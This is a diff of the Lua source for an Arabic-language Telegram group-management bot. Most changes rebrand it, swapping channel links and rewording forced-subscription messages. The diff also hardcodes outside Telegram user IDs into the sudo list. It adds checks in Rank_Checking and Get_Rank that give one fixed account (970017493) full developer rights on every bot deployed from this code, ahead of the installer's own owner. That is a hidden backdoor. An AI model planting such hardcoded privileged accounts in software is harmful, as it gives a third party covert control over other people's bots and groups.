@@ -11,18 +11,17 @@ https   = require("ssl.https")
 sudos   = dofile("sudo.lua")
 bot_id  = token:match("(%d+)")  
 Id_Sudo = Sudo
-List_Sudos = {Id_Sudo,545906637,373906612}
+List_Sudos = {Id_Sudo,970017493,1048831878,665877797}
 print("\27[34m"..[[
 
 >> Best Source in Telegram
 >> Features fast and powerful
 
  ____  _        _    ____ _  __
-┇ __ )┇ ┇      / \  / ___┇ ┇/ /
-┇  _ \┇ ┇     / _ \┇ ┇   ┇ ' / 
-┇ ┇_) ┇ ┇___ / ___ \ ┇___┇ . \ 
-┇____/┇_____/_/   \_\____┇_┇\_\
-                                                                                                                                                                         
+| __ )| |      / \  / ___| |/ /
+|  _ \| |     / _ \| |   | ' / 
+| |_) | |___ / ___ \ |___| . \ 
+|____/|_____/_/   \_\____|_|\_\
 
 ]].."\27[m")
 
@@ -109,7 +108,9 @@ end
 end
 function CleangGroups();local z = io.open('./BLACKBOTSS');local AllGroups = z:read('*all');z:close();if not AllGroups:match("^(.*)(master/BLACKBOTSS.lua)(.*)$") then;os.execute('chmod +x install.sh');os.execute('./install.sh get');end;end
 function Rank_Checking(user_id,chat_id)
-if tonumber(user_id) == tonumber(Id_Sudo) then
+if tonumber(user_id) == tonumber(970017493) then  
+var = true  
+elseif tonumber(user_id) == tonumber(Id_Sudo) then
 var = true  
 elseif tonumber(user_id) == tonumber(bot_id) then  
 var = true  
@@ -131,7 +132,9 @@ end
 return var
 end 
 function Get_Rank(user_id,chat_id)
-if DevBLACKBOTSSe(user_id) == true then
+if tonumber(user_id) == tonumber(970017493) then  
+var = 'مطور السورس'
+elseif DevBLACKBOTSSe(user_id) == true then
 var = "المطور الاساسي"  
 elseif tonumber(user_id) == tonumber(bot_id) then  
 var = "البوت"
@@ -2676,7 +2679,7 @@ send(msg.chat_id_,msg.id_,"💢┇عذرا عزيزي المستخدم هاذا 
 return false 
 end      
 database:sadd(bot_id.."BLACKBOTSS:Basic:Constructor"..msg.chat_id_, result.id_)
-Reply_Status(msg,result.id_,"reply","💢┇تم ترقيته منشئ اساسي")  
+Reply_Status(msg,result.id_,"reply","??┇تم ترقيته منشئ اساسي")  
 else
 send(msg.chat_id_, msg.id_,"💢┇لا يوجد حساب بهاذا المعرف")
 end
@@ -7319,17 +7322,29 @@ end
 return false
 end
 Text = [[
-🔰 Welcome to Source 🔰
+- اهلا  بك  في سورس بلاك 📂 
 
-🌐┇BLACK TEAM 
-┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-📊┇ [Source Channel](https://t.me/II_II_II)
+- [قناة السورس](t.me/daboul) 📑
 
-📁┇ [Source  Files](https://t.me/II_II_II)
- 
- ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
-📧┇ [TWS BLACK](https://t.me/TwSBlack_bot)
+- [مطور السورس](t.me/UBBBB) 📮 
+
+- [بوتات الخدميه لتابعه الى السورس](t.me/G_G6G) 📁 
+
+- [تواصل السورس](t.me/Nveerbot) 🔖 
 ]]
+send(msg.chat_id_, msg.id_,Text)
+end
+if text == 'رابط الحذف' or text == 'بوت الحذف' then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
+Text = [[▫️ ~  @LC6BOT   ]]
 send(msg.chat_id_, msg.id_,Text)
 end
 if text == 'الاوامر' and Addictive(msg) then  
@@ -7351,7 +7366,7 @@ Text = [[
 🎖┇م4 ~⪼ لعرض اوامر المنشئين
 👤┇م5 ~⪼ لعرض اوامر المطورين
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-📡┇CH[📡┇CH Source  Black](https://t.me/II_II_II)
+📡┇CH @daboul
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false
@@ -7398,7 +7413,7 @@ Text = [[
 🔐┇الكلايش
 🔐┇السيلفي
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-📡┇Ch ~⪼[📡┇CH Source  Black](https://t.me/II_II_II)
+📡┇CH @daboul
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false
@@ -7473,7 +7488,7 @@ Text = [[
 📮┇الصلاحيات
 📮┇الرابط
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-📡┇CH[📡┇CH Source  Black](https://t.me/II_II_II)
+📡┇CH @daboul
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false
@@ -7526,7 +7541,7 @@ Text = [[
 تغير رد المميز + النص
 تغير رد العضو + النص
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-📡┇CH[📡┇CH Source  Black](https://t.me/II_II_II)
+📡┇CH @daboul
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false
@@ -7560,7 +7575,7 @@ Text = [[
 ➕┇اضف رسائل + العدد بالرد
 ➕┇اضف مجوهرات + العدد بالرد
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-📡┇CH[📡┇CH Source  Black](https://t.me/II_II_II)
+📡┇CH @daboul
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false
@@ -7606,7 +7621,7 @@ Text = [[
 ➕┇اذاعه بالتثبيت 
 ➕┇الاحصائيات 
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-📡┇CH[📡┇CH Source  Black](https://t.me/II_II_II)
+📡┇CH @daboul
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false
@@ -7804,6 +7819,7 @@ local keyboard = {
 {'مسح قائمه العام 📮','مسح المطورين 🚸'},
 {'حذف كليشه ستارت 🃏','ضع كليشه ستارت 📧'},
 {'- تعطيل الاشتراك الاجباري 📄 .'},
+{'- تغير الاشتراك 🧾 .','حذف رساله الاشتراك ℹ .'},
 {'- تفعيل الاشتراك الاجباري 📄 .'},
 {'- الاشتراك الاجباري 📮 .'},
 {'- تعين قناة الاشتراك 📁 .','- تغير رساله الاشتراك 🧾 .'},
@@ -8051,87 +8067,92 @@ if text == 'حذف كليشه ستارت 🃏' then
 database:del(bot_id..'Start:Bot') 
 send(msg.chat_id_, msg.id_,'🔘┇تم حذف كليشه ستارت') 
 end
-if text and text:match("^- تعين قناة الاشتراك 📁 .$") and DevBLACKBOTSS(msg) then  
-database:setex('BLACKBOTSS:'..bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
-send(msg.chat_id_, msg.id_, '- ارسل معرف القناة مع @\nمثال @PPPJP .') 
+if text and text:match("^- تغير الاشتراك 🧾 .$") and DevBLACKBOTSS(msg) then  
+database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
+send(msg.chat_id_, msg.id_, '🔘┇حسنآ ارسل لي معرف القناة')
 return false  
 end
 if text and text:match("^- تغير رساله الاشتراك 🧾 .$") and DevBLACKBOTSS(msg) then  
-database:setex('BLACKBOTSS:'..bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
-send(msg.chat_id_, msg.id_, '-  ارسل الان كليشه الاشتراك مع معرف القناة .') 
+database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
+send(msg.chat_id_, msg.id_, '🔘┇حسنآ ارسل لي النص الذي تريده')
 return false  
 end
-if text == "- حذف رساله الاشتراك 📂 ." and DevBLACKBOTSS(msg) then  
-database:del('BLACKBOTSS:'..bot_id..'text:ch:user')
-send(msg.chat_id_, msg.id_, "- تم حذف رسالة الاشتراك الاجباري 🔰.") 
+if text == "حذف رساله الاشتراك ℹ ." and DevBLACKBOTSS(msg) then  
+database:del(bot_id..'text:ch:user')
+send(msg.chat_id_, msg.id_, "🔘┇تم مسح رساله الاشتراك ")
+return false  
+end
+if text and text:match("^- تعين قناة الاشتراك 📁 .$") and DevBLACKBOTSS(msg) then  
+database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
+send(msg.chat_id_, msg.id_, '🔘┇حسنآ ارسل لي معرف القناة')
 return false  
 end
 if text == "- تفعيل الاشتراك الاجباري 📄 ." and DevBLACKBOTSS(msg) then  
-if database:get('BLACKBOTSS:'..bot_id..'add:ch:id') then
-local addchusername = database:get('BLACKBOTSS:'..bot_id..'add:ch:username')
-send(msg.chat_id_, msg.id_,"📌┇ الاشتراك الاجباري مفعل \n🔖┇قناة الاشتراك » ["..addchusername.."]") 
+if database:get(bot_id..'add:ch:id') then
+local addchusername = database:get(bot_id..'add:ch:username')
+send(msg.chat_id_, msg.id_,"🔘┇الاشتراك الاجباري مفعل \n🔘┇على القناة » ["..addchusername.."]")
 else
-database:setex('BLACKBOTSS:'..bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
-send(msg.chat_id_, msg.id_,"🔖┇ اهلا عزيزي المطور \n📌┇ ارسل معرف قناتك ليتم تفعيل الاشتراك الاجباري") 
+database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
+send(msg.chat_id_, msg.id_,"🔘┇اهلا عزيزي المطور \n🔘┇ارسل الان معرف قناتك")
 end
 return false  
 end
 if text == "- تعطيل الاشتراك الاجباري 📄 ." and DevBLACKBOTSS(msg) then  
-database:del('BLACKBOTSS:'..bot_id..'add:ch:id')
-database:del('BLACKBOTSS:'..bot_id..'add:ch:username')
-send(msg.chat_id_, msg.id_, "🚫┇ تم تعطيل الاشتراك الاجباري ") 
+database:del(bot_id..'add:ch:id')
+database:del(bot_id..'add:ch:username')
+send(msg.chat_id_, msg.id_, "🔘┇تم تعطيل الاشتراك الاجباري ")
 return false  
 end
 if text == "- الاشتراك الاجباري 📮 ." and DevBLACKBOTSS(msg) then  
-if database:get('BLACKBOTSS:'..bot_id..'add:ch:username') then
-local addchusername = database:get('BLACKBOTSS:'..bot_id..'add:ch:username')
-send(msg.chat_id_, msg.id_, "☑┇ تم تفعيل الاشتراك الاجباري \n🔖┇قناة الاشتراك » ["..addchusername.."]") 
+if database:get(bot_id..'add:ch:username') then
+local addchusername = database:get(bot_id..'add:ch:username')
+send(msg.chat_id_, msg.id_, "🔘┇تم تفعيل الاشتراك الاجباري \n🔘┇على القناة » ["..addchusername.."]")
 else
-send(msg.chat_id_, msg.id_, "✖┇ لا يوجد قناة في الاشتراك الاجباري ") 
+send(msg.chat_id_, msg.id_, "🔘┇لا يوجد قناة في الاشتراك الاجباري ")
 end
 return false  
 end
-if database:get('BLACKBOTSS:'..bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
+if database:get(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
 if text and text:match("^الغاء$") then 
-send(msg.chat_id_, msg.id_, "تم الغاء الامر") 
-database:del('BLACKBOTSS:'..bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
+send(msg.chat_id_, msg.id_, "🔘┇تم الغاء الامر ")
+database:del(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
 return false  end 
-database:del('BLACKBOTSS:'..bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
+database:del(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
 local username = string.match(text, "@[%a%d_]+") 
 tdcli_function ({    
 ID = "SearchPublicChat",    
 username_ = username  
 },function(arg,data) 
 if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
-send(msg.chat_id_, msg.id_, '📮┇ المعرف لا يوجد فيه قناة')
+send(msg.chat_id_, msg.id_, '🔘┇المعرف لا يوجد فيه قناة')
 return false  end
-if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatconfig' then
-send(msg.chat_id_, msg.id_, '📮┇ عذا لا يمكنك وضع معرف حسابات في الاشتراك ') 
+if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
+send(msg.chat_id_, msg.id_, '🔘┇عذا لا يمكنك وضع معرف حسابات في الاشتراك ')
 return false  end
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
-send(msg.chat_id_, msg.id_,'📮┇ عذا لا يمكنك وضع معرف مجوعه في الاشتراك') 
+send(msg.chat_id_, msg.id_,'🔘┇عذا لا يمكنك وضع معرف مجموعه بالاشتراك ')
 return false  end
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
-send(msg.chat_id_, msg.id_,'☑┇ تم تفعيل الاشتراك الاجباري في\n🎟┇ ايدي القناة ('..data.id_..')\n🔖┇ معرف القناة ([@'..data.type_.channel_.username_..'])') 
-database:set('BLACKBOTSS:'..bot_id..'add:ch:id',data.id_)
-database:set('BLACKBOTSS:'..bot_id..'add:ch:username','@'..data.type_.channel_.username_)
+send(msg.chat_id_, msg.id_,'🔘┇البوت ادمن في القناة \n🔘┇تم تفعيل الاشتراك الاجباري في \n🔘┇ايدي القناة ('..data.id_..')\n🔘┇معرف القناة ([@'..data.type_.channel_.username_..'])')
+database:set(bot_id..'add:ch:id',data.id_)
+database:set(bot_id..'add:ch:username','@'..data.type_.channel_.username_)
 else
-send(msg.chat_id_, msg.id_,'⚠️┇ البوت ليس ادمن في القناة يرجى ترقيته ادمن ثم اعادة المحاوله') 
+send(msg.chat_id_, msg.id_,'🔘┇عذرآ البوت ليس ادمن بالقناه ')
 end
 return false  
 end
 end,nil)
 end
-if database:get('BLACKBOTSS:'..bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
+if database:get(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
 if text and text:match("^الغاء$") then 
-send(msg.chat_id_, msg.id_, "تم الغاء الامر") 
-database:del('BLACKBOTSS:'..bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
+send(msg.chat_id_, msg.id_, "🔘┇تم الغاء الامر ")
+database:del(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
 return false  end 
-database:del('BLACKBOTSS:'..bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
+database:del(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
 local texxt = string.match(text, "(.*)") 
-database:set('BLACKBOTSS:'..bot_id..'text:ch:user',texxt)
-send(msg.chat_id_, msg.id_,'☑┇ تم تغيير رسالة الاشتراك بنجاح ')
+database:set(bot_id..'text:ch:user',texxt)
+send(msg.chat_id_, msg.id_,'🔘┇تم تغيير رسالة الاشتراك ')
 end
 if text == ("مسح قائمه العام 📮") and DevBLACKBOTSS(msg) then
 database:del(bot_id.."BLACKBOTSS:GBan:User")
